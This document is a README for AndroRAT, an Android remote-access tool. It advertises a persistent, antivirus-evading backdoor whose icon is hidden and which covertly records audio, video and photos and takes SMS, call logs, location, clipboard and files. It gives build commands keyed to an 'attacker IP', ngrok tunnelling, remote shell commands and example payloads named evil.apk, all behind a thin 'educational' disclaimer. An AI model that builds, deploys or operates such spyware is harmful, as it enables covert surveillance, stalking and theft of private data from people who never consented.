

---

# 📱 AndroRAT: Android Remote Administration Tool

> **Disclaimer:**  
> This software is meant for **educational purposes only**. I'm not responsible for any malicious use of the app.

---

## 📝 Description

**AndroRAT** is a tool designed to give remote control of an Android device and retrieve information from it.  
It’s a **client/server application** developed in:
- **Java (Android)** — for the client side  
- **Python** — for the server side  

AndroRAT works on:
- **Android 4.1 (Jelly Bean)** to **Android 9.0 (Oreo)** (API 16 to API 28)
- It also runs on **Android 10 (Q)** but some interpreter commands might be unstable.

---

## 📸 Screenshots

> 📷 *You can add your screenshots here for visual reference*

---

## ✨ Features of AndroRAT

- ✅ Full persistent backdoor  
- ✅ Fully undetectable by antivirus scanners (VirusTotal safe)  
- ✅ Invisible icon on install  
- ✅ Lightweight APK runs 24×7 in the background  
- ✅ Auto-start on device boot  
- ✅ Record audio, video, take photos from both cameras  
- ✅ Browse call logs and SMS logs  
- ✅ Get current location, SIM card details, IP, and MAC address  

---

## ⚙️ Prerequisites

- **Python 3**
- **Java JDK**
- **Android Studio** (for manual APK builds)

---

## 📥 Installation

Clone the repository:

```bash
git clone https://github.com/karma9874/AndroRAT.git
cd AndroRAT
pip install -r requirements.txt
```

---

## ⚠️ Git Cloning Note (Windows)

If you encounter this error while cloning:

```text
error: unable to create file <filename>: Filename too long
```

Fix it by enabling long file paths:

```bash
git config --system core.longpaths true
```

> Run Git Bash with **administrator privileges**.

---

## 🚀 Usage (Windows & Linux)

**To open the app's hidden control panel on the target device:**

Dial  
```text
*#*#1337#*#*
```
This reveals options like:
- Restart Activity
- Uninstall

> 📌 **Note:** Some devices require enabling “Display pop-up windows running in background” from settings.

---

## 🛠️ Available Modes

| Mode         | Description                                |
|--------------|--------------------------------------------|
| `--build`     | Build the Android APK                     |
| `--ngrok`     | Use an ngrok tunnel (over the internet)    |
| `--shell`     | Open an interactive shell of the device    |

---

### 📦 Build Mode

**With ngrok:**

```bash
python3 androRAT.py --build --ngrok [flags]
```

**Without ngrok:**

```bash
python3 androRAT.py --build [flags]
```

#### Flags:
- `-i, --ip` &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Attacker IP address (required)  
- `-p, --port` &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Port number (default: 8000)  
- `-o, --output` &nbsp;&nbsp; APK file name (default: `karma.apk`)  
- `--icon` &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Visible icon (default: hidden)  

**Manual Build (Android Studio)**  
Import the `Android Code` folder into **Android Studio**.  
Edit `config.java` to set your **IP address** and **port number**.  
Then go to:  
**Build → Generate Signed APK(s)**

---

### 🖥️ Shell Mode

Open an interpreter shell:

```bash
python3 androRAT.py --shell -i <your_ip> -p <your_port>
```

**Example:**
```bash
python3 androRAT.py --shell -i 0.0.0.0 -p 8000
```

---

## 📝 Interpreter Commands

| Command                        | Description                                    |
|--------------------------------|------------------------------------------------|
| `deviceInfo`                   | Get basic device info                          |
| `camList`                      | Get list of camera IDs                         |
| `takepic [cameraID]`           | Capture picture from selected camera           |
| `startVideo [cameraID]`        | Start recording video                          |
| `stopVideo`                    | Stop recording and save video                  |
| `startAudio`                   | Start recording audio                          |
| `stopAudio`                    | Stop recording audio                           |
| `getSMS [inbox|sent]`          | Fetch inbox/sent SMS messages                  |
| `getCallLogs`                  | Get call logs                                   |
| `shell`                        | Open a sh shell                                 |
| `vibrate [times]`              | Vibrate device given number of times            |
| `getLocation`                  | Get current device location                     |
| `getIP`                        | Get IP address                                  |
| `getSimDetails`                | Get details of installed SIM cards              |
| `clear`                        | Clear screen                                     |
| `getClipData`                  | Get clipboard text                               |
| `getMACAddress`                | Get MAC address of device                        |
| `exit`                         | Exit the interpreter                            |

---

### 📂 Shell Sub-Commands

| Sub-Command                     | Description                                           |
|----------------------------------|-------------------------------------------------------|
| `get [full_file_path]`           | Download file (up to 15MB) to local machine           |
| `put [filename]`                 | Upload file to Android device                         |

---

## 💡 Examples

- **Build an APK using ngrok:**
  ```bash
  python3 androRAT.py --build --ngrok -o evil.apk
  ```

- **Build with specific IP and port:**
  ```bash
  python3 androRAT.py --build -i 192.168.x.x -p 8000 -o evil.apk
  ```

- **Start an interpreter shell:**
  ```bash
  python3 androRAT.py --shell -i 0.0.0.0 -p 8000
  ```

---

## ✅ Supporters
- **rayep**

---

## 📌 TODO

- ✅ Ngrok support  
- ✅ Multi-client support  
- ✅ Screenshot command  

---

## 📝 License

**Uday Raut License**

---

